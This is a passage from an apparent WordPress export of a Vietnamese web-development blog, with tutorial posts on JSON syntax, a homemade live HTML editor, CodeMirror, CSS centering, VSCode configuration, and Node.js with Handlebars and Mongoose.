Đối với number thì không được phép có chữ số 0 ở đầu. Ngoài ra, nếu đó là chữ số thập phân thì phải có ít nhất 1 chữ số sau dấu chấm (.).

1. JSON không hợp lệ
<pre>
// Key dạng biến số - không nằm trong cặp dầu ngoặc kép
const str1 = '{ text : "X", "number": 1990 }';

// Key đặt trong cặp dấu ngoặc đơn
const str2 = '{'text': "X", "number": 1990 }';

// Có dấu phẩy cuối cùng
const str3 = '{"text": "X", "number": 1990, }';

// Value là undefined
const str4 = '{"text": "X", "number": undefined }';

// Value chứa biểu thức tính toán
const str5 = '{"text": "X", "number": 1 + 1 }';

// Value là kiểu Date
const str6 = '{"text": "X", "number": new Date() }';

// Value là function
const str7 = '{"text": "X", "number": function () {} }';

// Value là number nhưng tồn tại số 0 ở đầu
const str8 = '{"text": "X", "number": 01990 }';

// Value là số thập phân nhưng sau dấu (.) không có chữ số nào
const str9 = '{"text": "X", "number": 1990. }';
</pre>

2. JSON hợp lệ
<pre>
/**
 * Key đặt trong cặp dấu ngoặc kép,
 * không có dấu phẩy ở cuối cùng.
 *
 * Value là string hoặc number - không có chữ số 0 ở đầu
 */
const str1 = '{"text": "X", "number": 1990 }';

// Nếu value là số thập phân thì sau dấu (.) phải có số
const str2 = '{"text": "X", "number": 1990.2 }';

// Value có thể là null
const str3 = '{"text": "X", "number": null }';

// Value có thể là boolean (true, false)
const str4 = '{"text": "X", "number": true }';

// Value có thể là array
const str5 = '{"text": "X", "number": [1, 2] }';
</pre>

3. Cách sử dụng
JavaScript cung cấp sẵn cho chúng ta hai hàm số là: JSON.stringify và JSON.parse:
JSON.stringify dùng để convert một JavaScript Object thành JSON string.
JSON.parse dùng để convert string biểu diễn JSON thành JavaScript Object.

<pre>
const string = JSON.stringify({name: "X", born: 1990});
console.log(string);
// => {"name":"X","born":1990}

const obj = JSON.parse(string);
console.log(obj.name);
// => X
console.log(obj.born);
// => 1990
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>579</wp:post_id>
		<wp:post_date><![CDATA[2020-12-27 04:29:31]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2020-12-27 04:29:31]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2020-12-27 04:29:31]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2020-12-27 04:29:31]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[json-javascript-object-notation]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="javascript"><![CDATA[Javascript]]></category>
						</item>
					<item>
		<title><![CDATA[JavaScript - HTML Editor]]></title>
		<link>https://duycode.com/2020/12/28/javascript-htmleditor/</link>
		<pubDate>Mon, 28 Dec 2020 17:45:09 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://duycode.com/?p=589</guid>
		<description></description>
		<content:encoded><![CDATA[Bản full: https://editor.duycode.com/
<h2>2. Bản 2.0</h2>
<pre>
<!DOCTYPE html>
<!-- saved from url=(0031)http://htmledit.squarefree.com/ -->
<html>

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=windows-1258">
  <title>Real-time HTML Editor</title>
  <script type="text/javascript">
    var editboxHTML = '<html class="expand close">'
      + '<head>'
      + '<style type="text/css">'
      + '.expand { width: 100%; height: 100%; }'
      + '.close { border: none; margin: 0px; padding: 0px; }'
      + 'html,body { overflow: hidden; }'
      + '<\/style>'
      + '<\/head>'
      + '<body class="expand close" onload="document.f.ta.focus(); document.f.ta.select();">'
      + '<form class="expand close" name="f">'
      + '<textarea class="expand close" style="background: #def;" name="ta" wrap="hard" spellcheck="false">'
      + '<\/textarea>'
      + '<\/form>'
      + '<\/body>'
      + '<\/html>';
    var old = '';

    function init() {
      window.editbox.document.write(editboxHTML);
      window.editbox.document.close();
      update();
    }

    function update() {
      var textarea = window.editbox.document.f.ta;
      var d = dynamicframe.document;
      if (old != textarea.value) {
        old = textarea.value;
        d.open();
        d.write(old);
        d.close();
      }
      window.setTimeout(update, 150);
    }
  </script>
</head>
<frameset resizable="yes" cols="50%,*" onload="init();">
  <frame name="editbox" src="javascript:&#39;&#39;;"></frame>
  <frame name="dynamicframe" src="javascript:&#39;&#39;;"></frame>
</frameset>

</html>
</pre>

<h2>3. Bản 3.0</h2>
<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>HTML Editor</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-size: 14px;
        }

        body {
            position: fixed;
            top: 0;
            bottom: 0;
            left: 0;
            right: 0;
            padding: 5px;
        }

        main {
            display: flex;
            flex-direction: row;
            height: 100%;
            font-family: Consolas, 'ConsolasRegular', 'Courier New', monospace !important;
        }

        #preview {
            flex-grow: 1;
        }

        iframe {
            width: 100%;
            height: 98%;
        }

        #editBox {
            display: flex;
            flex-direction: column;
            flex-wrap: nowrap;
            min-width: 300px;
            height: 98%;
            width: 50%;
            border: 1px solid #6c757d;
            margin-right: 2px;
            resize: horizontal;
            overflow: auto;
        }

        div.itemArea {
            background-color: #ddd;
            flex-grow: 0;
        }

        div.itemArea.active {
            flex-grow: 1;
        }

        #editBox.rotate {
            width: 100%;
            flex-wrap: wrap;
        }

        #editBox.rotate>#HTMLArea {
            height: 100%;
            flex-grow: 0;
        }

        #editBox.rotate>.itemArea {
            width: 50%;
        }

        textarea {
            overflow: auto;
            border: 0;
            padding: 0.5rem;
            display: none;
            width: 100%;
            height: calc(100% - 3rem) !important;
            border: 1px solid #6c757d;
        }

        .itemArea.active>textarea {
            display: block;
        }


        .btnNav {
            cursor: pointer;
            float: left;
            padding: 0.5rem 0.75rem;
            margin: 2px;
            border: 1px solid #6c757d;
            border-radius: 0.25rem 0.25rem 0 0;
            background-color: white;
        }

        .itemArea .btnNav:hover {
            background-color: #374958 !important;
            color: white;
        }

        .itemArea.active .btnNav:first-child {
            background-color: #6c757d;
            color: white;
        }

        #btnRotate,
        #btnNewWindow {
            float: right;
        }

        #btnFormat::before {
            content: "Demo ";
        }

        #btnFormat.addCode::before {
            content: "Clear ";
        }
    </style>
</head>

<body>
    <main>
        <div id="editBox">
            <div id="HTMLArea" class="itemArea active">
                <div class="itemNav">
                    <div id="HTMLNav" class="btnNav">index.html</div>
                    <div id="btnFormat" class="btnNav">Code</div>
                    <div id="btnNewWindow" class="btnNav">Open Popup </div>
                    <div id="btnRotate" class="btnNav">Rotate</div>
                </div>
                <textarea id="HTMLEditor" placeholder="Code HTML..."></textarea>
            </div>
            <div id="CSSArea" class="itemArea">
                <div class="itemNav">
                    <div id="CSSNav" class="btnNav">style.css</div>
                </div>
                <textarea id="CSSEditor" placeholder="Code CSS..."></textarea>
            </div>
            <div id="JSArea" class="itemArea">
                <div class="itemNav">
                    <div id="JSNav" class="btnNav">funtion.js</div>
                </div>
                <textarea id="JSEditor" placeholder="Code JS..."></textarea>
            </div>
        </div>
        <div id="preview">
            <iframe></iframe>
        </div>
    </main>

    <script>
        let HTMLEditor = document.getElementById("HTMLEditor");
        let CSSEditor = document.getElementById("CSSEditor");
        let JSEditor = document.getElementById("JSEditor");
        let editBox = document.getElementById("editBox");

        let btnNewWindow = document.getElementById("btnNewWindow");
        let btnFormat = document.getElementById("btnFormat");

        let preview = document.getElementById("preview");
        let itemArea = document.getElementsByClassName("itemArea");

        let windowPopup = null;

        let openPopup = () => {
            windowPopup = window.open("", "", "width=1000,height=700");
            let cssNode = document.createElement("style");
            let jsNode = document.createElement("script");
            cssNode.innerHTML = "body{width:100%;height:100%;margin:0;padding:0}iframe{width:100%;height:100%;border:0}";
            jsNode.innerHTML = "window.onbeforeunload=(e)=>{window.opener.messageFromChildWindow(\"closed\")}";
            windowPopup.document.head.append(cssNode);
            windowPopup.document.head.append(jsNode);
   
            preview.style.display = "none";
            btnNewWindow.classList.add("closePopup");
            btnNewWindow.innerText = "Close Popup";
        }
        let closePopup = () => {
            windowPopup = null;
            preview.style.display = "block";
            btnNewWindow.classList.remove("closePopup");
            btnNewWindow.innerText = "Open Popup ";
        }

        messageFromChildWindow = (msg) => {
            if (msg === 'closed') {
                closePopup();
                reloadPreview();
            }
        }

        btnNewWindow.onclick = () => {
            if (btnNewWindow.classList.contains("closePopup")) {
                windowPopup.close();
                closePopup();
            }
            else {
                openPopup();
            }
            reloadPreview();
        }

        window.onbeforeunload = function () {
            windowPopup.close();
        };

        btnFormat.onclick = () => {
            if (!btnFormat.classList.contains("addCode")) {
                for (i = 0; i < itemArea.length; i++) {
                    if (!itemArea[i].classList.contains("active")) {
                        itemArea[i].classList.add("active");
                    }
                }

                HTMLEditor.value = "<!DOCTYPE html>\n"
                    + "<html lang=\"en\"> \n"
                    + "<head>\n"
                    + "    <meta charset=\"UTF-8\">\n"
                    + "    <meta name=\"description\" content=\"The HTML5 Herald\">\n"
                    + "    <meta name=\"author\" content=\"Developer\">\n"
                    + "    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n"
                    + "    <title>Document<\/title>\n"
                    + "    <link rel=\"stylesheet\" href=\"\">\n"
                    + "<\/head>\n"
                    + "<body>\n"
                    + "    <h2 id=\"demo\">Click me, please !!!<\/h2>\n"
                    + "    <script src=\"\"><\/script>\n"
                    + "<\/body>\n"
                    + "<\/html>";
                CSSEditor.value = "h2 { \n"
                    + "    font-style: italic;\n"
                    + "    color: red;\n"
                    + "}";
                JSEditor.value = "let demoID = document.getElementById(\"demo\");\n"
                    + "    demoID.onclick = () => {\n"
                    + "    demoID.innerHTML = \"You click at: \" + new Date().toLocaleTimeString()\n"
                    + "        + \" - \" + new Date().getMilliseconds();\n"
                    + "}";
            }
            else {
                HTMLEditor.value = "";
                CSSEditor.value = "";
                JSEditor.value = "";
            }
            btnFormat.classList.toggle("addCode");
            reloadPreview();
        }

        document.getElementById("btnRotate").onclick = () => {
            editBox.classList.toggle("rotate");
        }

        document.body.onclick = () => {
            let thisID = event.target.id;
            let navID = String(thisID.match(/HTMLNav|CSSNav|JSNav/i));

            if (navID != null) {
                let areaID = navID.replace("Nav", "Area");
                let areaNode = document.getElementById(areaID);
                areaNode.classList.toggle("active");
            }
        };


        let writeWindow = (w) => {
            w.document.open();
            w.document.write(HTMLEditor.value);
            let css = document.createElement("style");
            let js = document.createElement("script");
            css.innerHTML = CSSEditor.value;
            js.innerHTML = JSEditor.value;
            w.document.head.append(css);
            w.document.body.append(js);
            w.document.close();
        }

        let reloadPreview = () => {
            let bodyFrame = null;
            if (windowPopup != null) {
                bodyFrame = windowPopup.document.body;
            }
            else {
                bodyFrame = preview;
            }
            bodyFrame.innerHTML = "";
            let iframeNode = document.createElement("iframe");
            bodyFrame.appendChild(iframeNode);
            let myFrame = bodyFrame.getElementsByTagName("iframe")[0];
            writeWindow(myFrame.contentWindow);
        }

        document.onkeyup = () => {
            reloadPreview();
        };

    </script>
</body>

</html>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>589</wp:post_id>
		<wp:post_date><![CDATA[2020-12-28 17:45:09]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2020-12-28 17:45:09]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2020-12-28 17:45:09]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2020-12-28 17:45:09]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[javascript-htmleditor]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="front-end"><![CDATA[Front End]]></category>
						</item>
					<item>
		<title><![CDATA[CodeMirror - Trình soạn thảo Code]]></title>
		<link>https://duycode.com/2020/12/30/codemirror-trinh-soan-thao-code/</link>
		<pubDate>Wed, 30 Dec 2020 12:04:00 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://duycode.com/?p=604</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>I. Cơ bản</h2>
- Trang chủ: <a href="https://codemirror.net/" rel="noopener noreferrer" target="_blank">https://codemirror.net/</a>
Một số tính năng hay:
- Code folding: thu nhỏ 1 tag
- Search - replace
- mattag:  nhìn tag đầu và cuối
- runmode: hiện code dạng plain text
- overlay: hiện màu {{text}} 
- lint: bắt lỗi
- merge view: so sánh 2 đoạn code
- fullscreen: phóng to code để xem toàn màn hình
- hint/showhint: gợi ý
- Lazy Mode Loading: tự chọn mode html, css hay js
<h2>II. Cài đặt và sử dụng</h2>
<h3>1. Thành phần cơ bản</h3>
<pre>
<script src="lib/codemirror.js"></script>
<link rel="stylesheet" href="lib/codemirror.css">
<script src="mode/javascript/javascript.js"></script>
</pre>

Sử dụng cơ bản
<pre>
let element = document.getElementsByClassName("demoClass")[0];
let editor = CodeMirror(element , {
    lineNumbers: true,
    tabSize: 4,
});
</pre>

<h3>2. Chọn thêm mode </h3>
<pre>
<script src="mode/css/css.js"></script>
<script src="mode/xml/xml.js"></script>
// mode: "css",
// mode: "xml",
</pre>

<h3>3. Show hint - Gợi ý đỉnh cao</h3>
<pre>
<!-- chon hint -->
<script src="codemirror/addon/hint/show-hint.js"></script>
<link rel="stylesheet" href="codemirror/addon/hint/show-hint.css">
<script src="codemirror/addon/hint/css-hint.js"></script>
<script src="codemirror/addon/hint/html-hint.js"></script>
<script src="codemirror/addon/hint/xml-hint.js"></script>
<script src="codemirror/addon/hint/javascript-hint.js"></script>
//extraKeys: {"Ctrl-Space":"autocomplete"},
</pre>








]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>604</wp:post_id>
		<wp:post_date><![CDATA[2020-12-30 12:04:00]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2020-12-30 12:04:00]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2020-12-30 12:04:00]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2020-12-30 12:04:00]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[codemirror-trinh-soan-thao-code]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="front-end"><![CDATA[Front End]]></category>
						</item>
					<item>
		<title><![CDATA[CSS - Căn giữa mọi thứ]]></title>
		<link>https://duycode.com/2021/01/06/css-can-giua-moi-thu/</link>
		<pubDate>Wed, 06 Jan 2021 00:34:49 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=615</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Căn giữa với element</h2>
<pre>
<style>
	.container {
		display: flex;
		flex-wrap: wrap;
	}
	.parent {
		margin: 10px;
		width: 200px;
		height: 200px;
		background-color: green;
	}
	.child {
		width: 100px;
		height: 100px;
		background-color: orange;
		display: flex;
		justify-content: center;
		align-items: center;
		color: white;
	}

	.example-1 {
		display: flex;
		justify-content: center;
		align-items: center;
	}

	.example-2 {
		display: flex;
		justify-content: center;
		align-content: center;
		flex-wrap: wrap;
	}

	.example-3 {
		display: flex;
	}
	.example-3 > .child {
		margin: auto;
	}

	.example-4 {
		position: relative;
	}
	.example-4 > .child {
		position: absolute;
		top: 50%;
		left: 50%;
		transform: translate(-50%,-50%);
	}
</style>

<div class="container">
	<div class="parent example-1">
		<div class="child">1</div>
	</div>

	<div class="parent example-2">
		<div class="child">2</div>
	</div>

	<div class="parent example-3">
		<div class="child">3</div>
	</div>

	<div class="parent example-4">
		<div class="child">4</div>
	</div>
</div>

</pre>

<h2>2. Căn giữa hình ảnh </h2>
<pre>
<style>
	.container {
		margin: 10px;
		width: 200px;
		height: 200px;
	}
	.example-1 {
		background-image: url("https://source.unsplash.com/400x300/?sport");
		background-position: center;
		background-repeat: no-repeat;
		background-size: cover;
	}
	.example-2 > img {
		width: 100%;
		height: 100%;
		object-fit: cover
	}
</style>

<div class="container example-1"></div>
<div class="container example-2">
	<img src="https://source.unsplash.com/400x300/?sport" alt="">
</div>

<img src="https://source.unsplash.com/400x300/?sport" alt="">
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>615</wp:post_id>
		<wp:post_date><![CDATA[2021-01-06 07:34:49]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-01-06 00:34:49]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-01-06 07:34:49]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-01-06 00:34:49]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[css-can-giua-moi-thu]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="css"><![CDATA[CSS]]></category>
						</item>
					<item>
		<title><![CDATA[VSCode - 1. Cơ bản]]></title>
		<link>https://duycode.com/2021/01/01/visual-studio-code/</link>
		<pubDate>Thu, 31 Dec 2020 18:00:05 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=702</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>I. Config</h2>
<h3>1. File setting.json</h3>
<pre>
{
    "workbench.tree.indent": 16,                                    //Tăng độ rộng cây thư mục        
    "liveServer.settings.host": "localhost",                        //Live server mặc định chạy "localhost"
    "editor.quickSuggestions": {                                    //Bật gợi ý với mọi thứ
        "other": true,
        "comments": true,
        "strings": true
    },        
}
</pre>

<h3>1. Auto Import</h3>
-- Tạo file: ./.jsconfig.json ở thư mục gốc
<pre>
{
  "compilerOptions": {
    "baseUrl": "./src",
    "checkJs": true,
    "jsx": "react"
  }
}
</pre>

<h3>2. Editorconfig</h3>
-- Trang chủ: https://editorconfig.org/
-- Tạo file: ./.editorconfig ở thư mục gốc
-- Cấu hình như sau:
<pre>
root = true
[*]
end_of_line = lf
insert_final_newline = true
indent_style = space
indent_size = 4
</pre>

<h3>2. Keyboard Shortcuts</h3>
- Gõ Ctrl+Shift+P -> Tìm kiếm "Open Keyboard Shortcuts (JSON)"
- Thêm vào file json, để tạo danh sách các phím tắt như sau:
- ctrl+k: xóa terminal
<pre>
[
    {
        "key": "ctrl+k",
        "command": "workbench.action.terminal.clear",
        "when": "terminalFocus"
    }
]
</pre>


<h3>4. Config Sapces default</h3>
- Settings: Tab Size" to 4 and unchecking the option "Detect Indentention"

<h2>II. Các phím tắt hay sử dụng</h2>
<h3>1. Windows</h3>
- Ctrl + Shift + P: mở setting, tạo phím tắt

- Ctrl + D: bôi đen từ giống như đang select
-> Shift + mũi tên phải: bôi đen tất cả thêm 1 chữ
-> Shift + Alt + mũi tên phải: bôi đen tất cả thêm 1 từ, dài ngắn khác nhau cũng đc

- Ctrl + K + W : tắt hết các tab đang sử dụng
- Alt + Shift + O: sắp xếp lại các import
- Ctrl + K + 0 : fold all lever (thu gọn các function lại)
- Ctrl + K + J : collapser all lever (mở rộng các function ra)


<h3>2. Terminal</h3>
--  Kill all server
<blockquote>taskkill /f /im node.exe</blockquote>
--  Tạo file nhanh
<blockquote>
type nul > index.html
#OR
$nul > index.html
</blockquote>
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>702</wp:post_id>
		<wp:post_date><![CDATA[2021-01-01 01:00:05]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2020-12-31 18:00:05]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-04-07 06:47:15]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-04-07 06:47:15]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[visual-studio-code]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="applications"><![CDATA[Applications]]></category>
						</item>
					<item>
		<title><![CDATA[NodeJS – 3. MVC: View & Template engine]]></title>
		<link>https://duycode.com/2021/01/18/nodejs-3-cac-thu-vien-co-ban/</link>
		<pubDate>Sun, 17 Jan 2021 18:16:08 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=709</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Cài đặt thư viện Template engine</h2>
<h3>1.1. Express Handlebars</h3>
--  <a href="https://www.npmjs.com/package/express-handlebars" rel="noopener" target="_blank">https://www.npmjs.com/package/express-handlebars</a>
-- Cài đặt: 
<pre>
npm install express-handlebars
</pre>

<h2>2. Tại main chính: ./src/index.js</h2>
<pre>
const path = require('path');
const express = require('express');

const handlebars = require('express-handlebars');

const app = express();
const port = 3000;

//Static public link
app.use(express.static(path.join(__dirname, 'public/')));

//Template engine
app.engine('hbs', handlebars({
  extname: '.hbs'
}));
app.set('view engine', 'hbs');
app.set('views',path.join(__dirname,'resources','views'));

app.get('/', (req, res) => {
  res.render('home');
  // res.send('<h1>Hello World!</h1>');
})

app.get('/news', (req, res) => {
  res.render('news');
})
</pre>

<h2>3. Cấu trúc thư mục views</h2>
<pre>
.
├── node_modules
├── src
│   ├── app
│   │    ├── controllers
│   │    └── models
│   ├── resources
│   │    └── views
│   │         ├── layouts
│   │         │      └── main.hbs
│   │         ├── partials
│   │         │      ├── header.hbs
│   │         │      └── footer.hbs
│   │         ├── home.hbs
│   │         └── news.hbs
│   └── routes
├── package-lock.json
└── package.json
</pre>

<h3>4. Tạo Layout </h3>
-- Tại file: ./src/resources/views/layouts/main.hbs
<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="">
</head>

<body>
    {{> header}}
    {{{body}}}
    {{> footer}}
</body>

</html>
</pre>

-- Tại file: ./src/resources/views/partials/header.hbs
<pre>
<h1>Header</h1>
</pre>

-- Tại file: ./src/resources/views/partials/footer.hbs
<pre>
<h1>Footer</h1>
</pre>

-- Tại file: ./src/resources/views/home.hbs
<pre>
<h1>HomePage</h1>
</pre>

-- Khi render bất kỳ một file nào, server sẽ render file main.hbs đầu tiên.
-- {{> header}} và {{> footer}} sẽ lấy từ header.hbs và footer.hbs trong partials
-- Sau đó file được render sẽ đi vào phần {{{body}}}, giả sử home.hbs


<h2>5. Render dữ liệu sang views</h2>
-- Tại nơi render, ví dụ: ./src/index.js
<pre>
app.get('/', (req, res) => {
    res.render('home', {
        project: "Demo NodeJS",
        author: [
            { name: "DuyCode", job: "developer" },
            { name: "John", job: "designer" },
            { name: "Peter", job: "marketing" },
        ],
    });
})
</pre>

-- Tại file: ./src/resources/views/home.hbs
<pre>
<h1>{{project}}</h1>

{{#each author}}
<h3>{{this.name}} -- {{this.job}}</h3>
{{/each}}
</pre>
-- Cách render đọc thêm tại: <a href="https://handlebarsjs.com/guide/" rel="noopener" target="_blank">https://handlebarsjs.com/guide/</a>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>709</wp:post_id>
		<wp:post_date><![CDATA[2021-01-18 01:16:08]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-01-17 18:16:08]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-01-18 01:16:08]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-01-17 18:16:08]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[nodejs-3-cac-thu-vien-co-ban]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="nodejs"><![CDATA[NodeJS]]></category>
						</item>
					<item>
		<title><![CDATA[NodeJS - 5. MVC: Model & MongoDB]]></title>
		<link>https://duycode.com/2021/01/18/nodejs-5-mvc-model-mongodb/</link>
		<pubDate>Mon, 18 Jan 2021 15:41:55 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=725</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Cài đặt thư viện Mongoose</h2>
Github: <a href="https://github.com/Automattic/mongoose" rel="noopener" target="_blank">https://github.com/Automattic/mongoose</a>
<pre>
npm install mongoose
</pre>

<h2>2. Tạo Connect MongoDB</h2>
<h3>1.1. Tại main chính: ./src/index.js</h3>
<pre>
const db = require('./config/db');

//Connect to DB
db.connect();
</pre>

<h3>1.2. Tạo file connect: ./src/config/db/index.js</h3>
<pre>
const mongoose = require('mongoose');

async function connect() {
    try {
        await mongoose.connect('mongodb://localhost:27017/f8_education_dev', {
            useNewUrlParser: true,
            useUnifiedTopology: true,
            useCreateIndex: true,
        });
        console.log('Connect successfully !!!');
    } catch (error) {
        console.log('Connect failure !!!');
    }
}

module.exports = { connect };

</pre>
-- Nếu connect không thành công, sau 30 giây, sẽ bắn ra lỗi error

<h2>3. Tạo Model</h2>
-- Thêm thư viện slug (đường dẫn) của mongoose
<pre>
npm install mongoose-slug-generator --save
</pre>

-- Tạo file: ./src/app/models/Courses.js
<pre>
const mongoose = require('mongoose');

const slug = require('mongoose-slug-generator');
const mongooseDelete = require('mongoose-delete');

const Schema = mongoose.Schema;

const CourseSchema = new Schema(
    {
        name: {type: String,require: true,default: '',minlength: 1,maxlength: 255,},
        description: { type: String },
        image: { type: String },
        videoID: { type: String, require: true },
        level: { type: String },
        slug: { type: String, slug: 'name', unique: true },
    },
    {
        timestamps: true,
    },
);

//Add plugins
mongoose.plugin(slug);
CourseSchema.plugin(mongooseDelete, {
    deletedAt: true,
    overrideMethods: 'all',
});

// module.exports = mongoose.model('ModelName', mySchema)
module.exports = mongoose.model('Course', CourseSchema);

</pre>
-- ModelName: viết ở dạng số nhiều -> mongoose sẽ tự đổi thành chữ viết thường + số nhiều để tương ứng với tên collection trong database


<h2>4. Sử dụng Controller kết nối Model, và render ra View</h2>
-- Xem phần CRUD]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>725</wp:post_id>
		<wp:post_date><![CDATA[2021-01-18 22:41:55]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-01-18 15:41:55]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-01-18 22:41:55]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-01-18 15:41:55]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[nodejs-5-mvc-model-mongodb]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="nodejs"><![CDATA[NodeJS]]></category>
						</item>
					<item>
		<title><![CDATA[NodeJS - Làm việc nhóm với Git - Format Code]]></title>
		<link>https://duycode.com/2021/01/19/nodejs-lam-viec-nhom-voi-git-format-code/</link>
		<pubDate>Tue, 19 Jan 2021 05:36:25 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=735</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Các thư viện cần thiết</h2>
<h3>1.1. Prettier: </h3>
- Prettier mục đích để format code theo quy chuẩn
Github: <a href="https://github.com/prettier/prettier" rel="noopener" target="_blank">https://github.com/prettier/prettier</a>
Document: <a href="https://prettier.io/docs/en/" rel="noopener" target="_blank">https://prettier.io/docs/en/</a>
Config: <a href="https://prettier.io/docs/en/configuration.html" rel="noopener" target="_blank">https://prettier.io/docs/en/configuration.html</a>
<h3>1.2. Lint-staged</h3>
